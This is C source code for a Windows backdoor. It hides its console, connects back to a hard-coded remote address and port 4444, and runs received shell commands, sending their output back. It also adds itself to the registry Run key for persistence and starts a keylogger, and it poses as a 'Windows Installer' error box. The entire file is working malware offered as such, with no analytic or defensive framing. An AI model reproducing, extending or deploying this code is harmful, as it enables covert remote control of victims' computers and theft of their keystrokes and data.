#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

// Substring function
char* substring(char *destination, const char *source,int size, int beg, int n);

// Create persistent malware
int bootRun();

// Create shell 
void Shell();

// Windows main function
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    
    HWND stealh;
    // Alloc Console to the process
    AllocConsole();
    stealh = FindWindowA("ConsoleWindowClass", NULL);   
    // hide the console
    ShowWindow(stealh, 0);

    //Ip and port of remote server
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "172.20.10.7";
    ServPort = 4444;

    if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
        exit(1);
    }
    // init socket
    sock = socket(AF_INET, SOCK_STREAM, 0); 
    // clear ServAddr
    bzero(&ServAddr, sizeof(ServAddr));
    // init 
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);

    // try to connect to remote server
    start:
    while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
        Sleep(10);
        goto start;
    }
    MessageBox(NULL, TEXT("You've been hacked !"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
    Shell();

}

void Shell(){
    char buffer[1024];
    char directory[1024];
    char container[1024];
    char total_response[18384];

    //infinite loop
    while(1){
        jump:
        //clear var
        bzero(buffer, sizeof(buffer));
        bzero(directory, sizeof(directory));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        //receive commands
        recv(sock, buffer, 1024, 0);

        if(strncmp("q", buffer, 1) == 0){
            // q => quit the program
            closesocket(sock);
            WSACleanup();
            exit(1);
        } else if(strncmp("cd ", buffer, 3) == 0){
            substring(directory, buffer, sizeof(buffer),3, 100);
            chdir(directory);
        } else if(strncmp("persist", buffer, 7) == 0){
            bootRun();
        } else if(strncmp("keylog_start", buffer, 12) == 0){
            HANDLE thr = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            goto jump;
        } else {
            FILE *fd;
            fd = _popen(buffer, "r");
            while(fgets(container, 1024, fd) != NULL){
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fd);
        }

    }
}


int bootRun(){
    char err[128] = "Failed!\n";
    char suc[128] = "Created persistence at : KHEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD path_length = 0;

    path_length = GetModuleFileName(NULL, szPath, MAX_PATH);
    if(path_length == 0){
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY newVal;
    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newVal) != ERROR_SUCCESS){
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD path_length_bytes = path_length * sizeof(*szPath);
    if(RegSetValueEx(newVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, path_length_bytes) != ERROR_SUCCESS){
        RegCloseKey(newVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(newVal);
    send(sock, suc, sizeof(suc), 0);
    return 1;

}

char* substring(char *destination, const char *source,int size, int beg, int n)
{
	// extracts n characters from source string starting from beg index
	// and copy them into the destination string
	if(n > size)
	{
		n = size;
	}
	while (n > 0)
	{
		*destination = *(source + beg);

		destination++;
		source++;
		n--;
	}
	// null terminate destination string
	*destination = '\0';
	// return the destination string
	return destination;
}
